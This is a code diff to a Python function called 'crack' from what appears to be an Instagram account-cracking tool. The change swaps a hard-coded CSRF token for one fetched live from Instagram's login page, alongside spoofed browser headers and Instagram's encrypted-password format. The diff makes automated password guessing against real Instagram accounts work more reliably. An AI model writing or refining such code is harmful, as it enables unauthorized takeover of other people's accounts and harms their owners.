@@ -124,8 +124,10 @@ def crack(uid, pww, total_idz):
             session = requests.Session()
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            response = session.get('https://www.instagram.com/accounts/login/')
+            csrf_token = response.cookies['csrftoken']
             cookies = {
-                'csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'csrftoken': csrf_token,
                 'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
                 'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
                 'ig_nrcb': '1',
@@ -159,7 +161,7 @@ def crack(uid, pww, total_idz):
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                 'x-asbd-id': '129477',
-                'x-csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'x-csrftoken': csrf_token,
                 'x-ig-app-id': '936619743392459',
                 'x-ig-www-claim': '0',
                 'x-instagram-ajax': '1015781171',
